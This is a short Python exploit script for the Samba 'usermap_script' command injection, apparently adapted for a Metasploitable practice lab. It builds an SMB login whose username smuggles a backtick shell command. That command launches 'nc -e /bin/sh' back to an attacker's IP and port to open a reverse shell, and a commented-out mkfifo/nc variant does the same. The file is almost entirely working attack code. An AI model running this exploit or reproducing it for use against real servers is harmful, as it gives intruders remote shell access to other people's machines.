#!/usr/bin/python

from smb.SMBConnection import SMBConnection
from smb import *
import random, string
from smb import smb_structs
smb_structs.SUPPORT_SMB2 = False
import sys

# Modified version by Aqeeb Hussain

# Original code credit: https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851

def usage():
  if len(sys.argv) < 4:
    print("\nUsage: " + sys.argv[0] + " <Target IP> <Local IP> <Port>")
    sys.exit()


def main():
  usage()
  target_ip = sys.argv[1]
  local_ip = sys.argv[2]
  port = sys.argv[3]

  #payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {}".format(local_ip, port)
  # Less likely to be installed
  payload = "nc -e /bin/sh {} {}".format(local_ip, port )
  username = ('/=`nohup {} `'.format(payload))
  password = ''

  # Main connection done via this variable
  conn = SMBConnection.SMBConnection(username, password, "SOMEBODYHACKINGYOU", "METASPLOITABLE",
    use_ntlm_v2 = False)

  # Target IP address

  # This is a socket call
  conn.connect(sys.argv[1], 445)

main()
